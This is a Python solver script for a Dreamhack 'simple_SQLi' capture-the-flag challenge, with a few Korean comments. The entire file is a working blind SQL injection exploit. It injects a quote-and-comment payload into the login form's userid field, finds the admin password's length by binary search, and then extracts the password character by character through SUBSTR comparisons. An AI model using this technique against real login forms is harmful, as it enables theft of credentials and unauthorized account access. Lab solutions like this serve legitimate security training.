import requests
import sys

# URL 형식으로 합쳐줌
from urllib.parse import urljoin


class Solver:
    """Solver for simple_SQLi challenge using Blind SQL Injection"""

    # initialization
    def __init__(self, host: str, port: str) -> None:
        self._chall_url = f"http://{host}.dreamhack.games:{port}"
        self._login_url = urljoin(self._chall_url, "login")

    # base HTTP methods
    def _login(self, userid: str, userpassword: str) -> bool:
        login_data = {
            "userid": userid,
            "userpassword": userpassword
        }

        response = requests.post(self._login_url, data=login_data)
        return response

    # base sqli methods
    def _sqli(self, query: str) -> requests.Response:

        # " or {query} -- "hi" 형태로 삽입
        response = self._login(f"\" or {query}--", "hi")

        return response

    def _sqli_lt_binsearch(self, query_tmpl: str, low: int, high: int) -> int:
        while 1:
            mid = (low+high) // 2

            if low+1 >= high:
                break

            query = query_tmpl.format(value=mid)

            if "hello" in self._sqli(query).text:
                high = mid
            else:
                low = mid

        return mid

    # attack methods
    def _find_password_length(self, user: str, max_pw_len: int = 100) -> int:
        query_tmpl = f"((SELECT LENGTH(userpassword) WHERE userid=\"{user}\") < {{value}})"
        pw_len = self._sqli_lt_binsearch(query_tmpl, 0, max_pw_len)

        return pw_len

    def _find_password(self, user: str, pw_len: int) -> str:
        pw = ''

        for index in range(1, pw_len + 1):
            query_tmpl = f"((SELECT SUBSTR(userpassword, {index}, 1) WHERE userid=\"{user}\") < CHAR({{value}}))"

            # _sqli_lt_binsearch(query_tmpl, 47, 126) : from 0 to ~
            pw += chr(self._sqli_lt_binsearch(query_tmpl, 0x2f, 0x7e))
            '''pw += chr(self._sqli_lt_binsearch(query_tmpl, 47, 126)) 도 가능'''
            print(f"{index}. {pw}")

        return pw

    def solve(self):

        # Find the length of admin password
        pw_len = solver._find_password_length("admin")
        print(f"Length of admin password is: {pw_len}")

        # Find the admin password
        print("Finding password: ")
        pw = solver._find_password("admin", pw_len)
        print(f"Password of the admin is : {pw}")


if __name__ == "__main__":
    host = sys.argv[1]
    port = sys.argv[2]

    solver = Solver(host, port)
    solver.solve()
